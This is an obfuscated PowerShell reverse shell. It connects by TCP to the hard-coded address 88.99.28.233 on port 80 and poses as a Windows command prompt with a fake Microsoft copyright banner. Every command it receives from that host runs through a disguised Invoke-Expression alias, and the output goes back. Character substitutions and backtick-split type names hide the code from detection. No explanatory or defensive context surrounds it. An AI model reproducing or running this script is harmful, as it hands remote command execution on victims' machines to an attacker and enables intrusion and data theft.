S@t-Alia@s@ -Na@m@ K -Va@lu@ Out-String
S@t-Alia@s@ -Na@m@ nothingH@r@ -Va@lu@ i@x
$BT = N@w-Obj@ct "S`y`s@t@m.N@t.Sock@ts@.T`CPCl`i@nt"('88.99.28.233', 80);
$r@pla@c@ = $BT.G@tStr@a@m();
[byt@[]]$B = 0..(32768*2-1)|%{0};
$B = ([t@xt.@ncoding]::UTF8).G@tByt@s@("(c) Micros@oft Corpora@tion. All rights@ r@s@@rv@d.`n`n")
$r@pla@c@.Writ@($B,0,$B.L@ngth)
$B = ([t@xt.@ncoding]::ASCII).G@tByt@s@((G@t-Loca@tion).Pa@th + '>')
$r@pla@c@.Writ@($B,0,$B.L@ngth)
[byt@[]]$int = 0..(10000+55535)|%{0};
whil@(($i = $r@pla@c@.R@a@d($int, 0, $int.L@ngth)) -n@ 0){;
$ROM = [t@xt.@ncoding]::ASCII.G@tString($int,0, $i);
$I = (nothingH@r@ $ROM 2>&1 | K );
$I2  = $I + (pwd).Pa@th + '> ';
$U = [t@xt.@ncoding]::ASCII.G@tByt@s@($I2);
$r@pla@c@.Writ@($U,0,$U.L@ngth);
$r@pla@c@.Flus@h()};
$BT.Clos@@()
